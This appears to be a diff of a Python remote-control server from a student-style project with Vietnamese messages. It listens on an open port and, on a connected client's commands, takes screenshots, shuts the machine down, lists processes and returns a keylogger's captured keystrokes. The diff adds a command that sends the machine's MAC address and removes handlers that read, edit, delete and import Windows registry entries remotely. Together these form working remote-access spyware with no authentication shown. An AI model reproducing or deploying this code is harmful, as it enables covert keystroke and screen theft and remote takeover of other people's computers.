@@ -8,6 +8,7 @@ import subprocess
 import pynput
 import tkinter as tk
 import threading
+from getmac import get_mac_address as gma
 
 HOST = "0.0.0.0"
 PORT = 54321
@@ -56,11 +57,7 @@ def connect():
         return
     try:
         while True:
-            data = conn.recv(1024)
-            try:
-                encodedData = data.decode("utf8")
-            except:
-                encodedData = data.decode("utf_16")
+            encodedData = conn.recv(1024).decode("utf8")
             if encodedData == "*snap*":
                 snapshot = ImageGrab.grab()
                 file = "scr.jpg"
@@ -76,100 +73,10 @@ def connect():
             elif encodedData == "-exit-":
                 conn.close()
                 break
+            elif encodedData == "-getmac-":
+                conn.sendall(bytes(gma(), "utf8"))
             elif encodedData == "*close*":
                 os.system("shutdown /s /t 1")
-            elif encodedData[0] == "1":
-                splitPoint = encodedData.index("***")
-                rootSplit = encodedData.index("\\")
-                rootKey = encodedData[1:rootSplit]
-                subKey = encodedData[rootSplit+1:splitPoint]
-                value = encodedData[splitPoint+3:]
-                try:
-                    accessKey = winreg.OpenKey(keyDic.get(rootKey), subKey)
-                    result = winreg.QueryValueEx(accessKey, value)
-                    if result[1] == 1 or result[1] == 2:
-                        conn.sendall(bytes(result[0], "utf8"))
-                    elif result[1] == 4 or result[1] == 11:
-                        conn.sendall(bytes(str(result[0]), "utf8"))
-                    elif result[1] == 3:
-                        data = ""
-                        for byte in result[0]:
-                            data = data+str(byte)+" "
-                        conn.sendall(bytes(data, "utf8"))
-                    elif result[1] == 7:
-                        data = ""
-                        for string in result[0]:
-                            data = data+string+"\n"
-                        conn.sendall(bytes(data, "utf8"))
-                except:
-                    conn.sendall(bytes("Lỗi", "utf8"))
-            elif encodedData[0] == "2":
-                splitPoint1 = encodedData.index("**")
-                splitPoint2 = encodedData.index("***")
-                splitPoint3 = encodedData.index("****")
-                rootSplit = encodedData.index("\\")
-                rootKey = encodedData[1:rootSplit]
-                subKey = encodedData[rootSplit+1:splitPoint1]
-                nameValue = encodedData[splitPoint1+2:splitPoint2]
-                newValue = encodedData[splitPoint2+3:splitPoint3]
-                typeValue = encodedData[splitPoint3+4:]
-                try:
-                    accessKey = winreg.OpenKey(
-                        keyDic.get(rootKey), subKey, 0, winreg.KEY_SET_VALUE)
-                    if typeValue == "Binary":
-                        newValue = bytearray(newValue, "utf8")
-                    elif typeValue == "DWORD" or typeValue == "QWORD":
-                        newValue = int(newValue)
-                    elif typeValue == "Multi-String":
-                        newValue = newValue.split("\n")
-                    winreg.SetValueEx(accessKey, nameValue, 0,
-                                      typeDic.get(typeValue), newValue)
-                    conn.sendall(bytes("Đã sửa giá trị thành công", "utf8"))
-                except:
-                    conn.sendall(bytes("Lỗi", "utf8"))
-            elif encodedData[0] == "3":
-                splitPoint = encodedData.index("***")
-                rootSplit = encodedData.index("\\")
-                rootKey = encodedData[1:rootSplit]
-                subKey = encodedData[rootSplit+1:splitPoint]
-                value = encodedData[splitPoint+3:]
-                try:
-                    accessKey = winreg.OpenKey(
-                        keyDic.get(rootKey), subKey, 0, winreg.KEY_WRITE)
-                    winreg.DeleteValue(accessKey, value)
-                    conn.sendall(bytes("Xóa value thành công", "utf8"))
-                except:
-                    conn.sendall(bytes("Lỗi", "utf8"))
-            elif encodedData[0] == "4":
-                rootSplit = encodedData.index("\\")
-                rootKey = encodedData[1:rootSplit]
-                subKey = encodedData[rootSplit+1:]
-                try:
-                    winreg.CreateKey(keyDic.get(rootKey), subKey)
-                    conn.sendall(bytes("Tạo key thành công", "utf8"))
-                except:
-                    conn.sendall(bytes("Lỗi", "utf8"))
-            elif encodedData[0] == "5":
-                rootSplit = encodedData.index("\\")
-                rootKey = encodedData[1:rootSplit]
-                subKey = encodedData[rootSplit+1:]
-                try:
-                    winreg.DeleteKey(keyDic.get(rootKey), subKey)
-                    conn.sendall(bytes("Xóa key thành công", "utf8"))
-                except:
-                    conn.sendall(bytes("Lỗi", "utf8"))
-            elif encodedData[0] == "6":
-                fileContent = encodedData[1:]
-                f = open("xyzijk.reg", "w", encoding="utf_16")
-                f.seek(0)
-                f.write(fileContent)
-                f.truncate()
-                f.close()
-                if os.system("reg import xyzijk.reg") == 0:
-                    os.remove("xyzijk.reg")
-                    conn.sendall(bytes("s", "utf8"))
-                else:
-                    conn.sendall(bytes("f", "utf8"))
 
             elif encodedData == "see_process":
                 res_final = []
@@ -270,6 +177,8 @@ def connect():
             elif encodedData == "printkey":
                 f = open("keylog.txt", "r", encoding="utf8")
                 content = f.read()
+                if(content == ""):
+                    conn.sendall(bytes(" ", "utf8"))
                 conn.sendall(bytes(content, "utf8"))
                 f.close()
             elif encodedData == "-deletekeylogfile-":
